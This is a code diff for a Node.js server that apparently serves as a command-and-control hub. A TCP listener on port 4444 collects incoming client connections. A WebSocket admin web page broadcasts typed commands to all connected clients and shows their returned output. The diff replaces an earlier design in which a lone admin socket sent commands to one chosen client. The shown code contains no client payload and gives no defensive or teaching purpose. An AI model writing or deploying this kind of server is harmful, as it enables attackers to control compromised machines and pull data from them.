@@ -1,85 +1,59 @@
 const net = require('net');
+const express = require('express');
+const path = require('path');
+const WebSocket = require('ws');
 
-// Ports for client and admin servers
-const clientPort = 8443;
-const adminPort = 8080;
+const app = express();
+const port = 5555;  // Port for admin web interface
+const cmdPort = 4444;  // Port for client connections
 
-const clients = {};
-let adminSocket = null;
+let clients = [];
 
-// Function to list connected clients
-function listClients() {
-    return Object.keys(clients).join('\n');
-}
+// WebSocket server for admin control
+const wss = new WebSocket.Server({ noServer: true });
 
-// Create a TCP server for client connections
-const clientServer = net.createServer((clientSocket) => {
-    const clientId = `${clientSocket.remoteAddress}:${clientSocket.remotePort}`;
-    console.log(`Client connected: ${clientId}`);
-    clients[clientId] = clientSocket;
-
-    // Notify admin about new client connection
-    if (adminSocket) {
-        adminSocket.write(`Client connected: ${clientId}\n`);
-    }
-
-    clientSocket.on('data', (data) => {
-        console.log(`Received from ${clientId}: ${data.toString().trim()}`);
-        if (adminSocket) {
-            adminSocket.write(`Client ${clientId}: ${data}`);
-        }
-    });
-
-    clientSocket.on('end', () => {
-        console.log(`Client disconnected: ${clientId}`);
-        delete clients[clientId];
-        if (adminSocket) {
-            adminSocket.write(`Client disconnected: ${clientId}\n`);
-        }
-    });
-
-    clientSocket.on('error', (err) => {
-        console.error(`Error with client ${clientId}: ${err.message}`);
+// Handle WebSocket connections (from admin)
+wss.on('connection', (ws) => {
+    ws.on('message', (message) => {
+        console.log('Received from admin:', message);
+        // Broadcast the command to all connected clients
+        clients.forEach(client => client.socket.write(message + '\n'));
     });
 });
 
-clientServer.listen(clientPort, '0.0.0.0', () => {
-    console.log(`Client server listening on port ${clientPort}`);
-});
+// TCP server to handle client connections
+const cmdServer = net.createServer((socket) => {
+    const clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
+    console.log(`New client connected: ${clientAddress}`);
 
-// Create a TCP server for admin connections
-const adminServer = net.createServer((socket) => {
-    console.log('Admin connected');
-    adminSocket = socket;
+    clients.push({ socket, address: clientAddress });
 
     socket.on('data', (data) => {
-        const command = data.toString().trim();
-        if (command === 'list_clients') {
-            const clientList = listClients();
-            socket.write(`Connected clients:\n${clientList}\n`);
-        } else if (command.startsWith('send')) {
-            const [_, clientId, ...cmdParts] = command.split(' ');
-            const cmd = cmdParts.join(' ');
-            if (clients[clientId]) {
-                clients[clientId].write(cmd);
-            } else {
-                socket.write(`Client ${clientId} not found\n`);
-            }
-        } else {
-            socket.write("Invalid command. Use 'send <client_id> <command>' or 'list_clients'.\n");
-        }
+        console.log(`Received from ${clientAddress}: ${data.toString()}`);
+        // Send output back to the admin via WebSocket
+        wss.clients.forEach(ws => ws.send(`${clientAddress}: ${data.toString()}`));
     });
 
     socket.on('end', () => {
-        console.log('Admin disconnected');
-        adminSocket = null;
-    });
-
-    socket.on('error', (err) => {
-        console.error(`Error with admin: ${err.message}`);
+        console.log(`Client disconnected: ${clientAddress}`);
+        clients = clients.filter(client => client.socket !== socket);
     });
 });
 
-adminServer.listen(adminPort, '0.0.0.0', () => {
-    console.log(`Admin server listening on port ${adminPort}`);
+cmdServer.listen(cmdPort, () => {
+    console.log(`Command server listening on port ${cmdPort}`);
+});
+
+// HTTP server to serve the admin interface
+app.use(express.static(path.join(__dirname, 'public')));
+
+const server = app.listen(port, () => {
+    console.log(`Admin interface available at http://localhost:${port}`);
+});
+
+// Handle WebSocket upgrade
+server.on('upgrade', (request, socket, head) => {
+    wss.handleUpgrade(request, socket, head, (ws) => {
+        wss.emit('connection', ws, request);
+    });
 });
